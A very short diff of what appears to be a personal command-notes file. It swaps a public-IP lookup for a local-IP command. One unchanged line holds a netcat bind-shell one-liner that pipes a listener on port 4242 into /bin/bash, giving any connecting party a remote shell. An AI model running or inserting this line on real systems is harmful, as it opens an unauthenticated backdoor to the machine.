@@ -1,4 +1,4 @@
-curl ifconfig.me
+Get local ip address: ipconfig getifaddr en0
 
 mkfifo foo ; nc -lk 4242 0<foo | /bin/bash 1>foo ./cool.sh
 
